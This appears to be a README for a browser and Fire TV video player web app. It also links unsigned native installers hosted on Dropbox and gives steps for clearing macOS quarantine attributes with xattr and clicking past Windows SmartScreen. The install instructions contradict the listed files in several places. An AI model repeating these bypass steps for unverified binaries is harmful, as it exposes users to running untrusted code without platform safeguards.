# <img src="https://skabajah.github.io/saturn/App/icons/saturn.svg" height="40" style="vertical-align: middle; pointer-events: none;"> Project Saturn

[Saturn App](https://skabajah.github.io/saturn/App/)

A lightweight, touch-friendly video player web app for browsers and Fire TV.

## Features

- Full-screen cinematic landing screen
- Auto-detects browser (Chrome, Safari, Firefox, Fire TV)
- Built-in video player with autoplay
- Remote-control friendly (Fire TV optimized)
- PWA-ready with icons and manifest
- Google Analytics integrated

## Quick Start

Open `index.html` in your browser, or serve locally with Python.

Click or tap anywhere to enter the app and start the player.

## Structure

- `index.html` – Main entry point
- `icons/` – Favicons and PWA assets
- `App/` – CSS and JavaScript (hosted externally)
- `landing.svg` – Splash screen graphic

## Customization

- **Video source**: Edit `controls.js` or add a `<source>` tag
- **Splash screen**: Replace `landing.svg`
- **Browser detection**: Modify the `userAgent` logic in `index.html`

## PWA Ready

Installable on Chrome and Edge for a native-like experience.

---

## Download & Install

Grab the installer for your machine:

| Platform | Architecture | File | Direct Link |
|----------|--------------|------|-------------|
| **Mac** (Apple Silicon / M-Series) | `arm64` | `mac-arm64.zip` | [Download](https://www.dropbox.com/scl/fi/fz7jb7abhnxm1j6ksbyyx/mac-arm64.zip?rlkey=vchyk5euvjjq00z3am8d7qufi&st=i4dp8lcq&dl=1) |
| **Mac** (Intel) | `x64` | `mac-intel.zip` | [Download](https://www.dropbox.com/scl/fi/mve5vohv7hwjro9qnz2ux/mac-intel.zip?rlkey=rxzl1jt47qlzgthn82wwi3c1t&st=r8dy3w3r&dl=1) |
| **Windows** | `x64` | `windows-setup.zip` | [Download](https://www.dropbox.com/scl/fi/ftb2arsz7wk2dka7j48bs/windows-setup.zip?rlkey=rarziyck4pzgx90lidr49ad4l&st=vhj2g8bc&dl=1) |
---

### Installing on macOS

1. Download the correct file for your Mac:
2. Double-click the `.zip` to mount it.
3. Drag **Saturn** into your `Applications` folder.
4. Eject the disk image.

#### How to fix the Mac Error  
*(Because the app is not signed by Apple, macOS will block it unless you bypass Gatekeeper first).*

First, navigate to the folder where you downloaded the `.zip` file and extract it:
```
cd pathfolder
```

Then, run the following commands: 
```
xattr -cr Saturn.app
open Saturn.app
```

---

### Installing on Windows

1. Download `Saturn.exe`.
2. Double-click the `.exe`.
3. If SmartScreen appears (*"Windows protected your PC"*), click **More info** → **Run anyway**.
4. Follow the installer prompts.

---

## License

All Rights Reserved © Shadi Kabajah
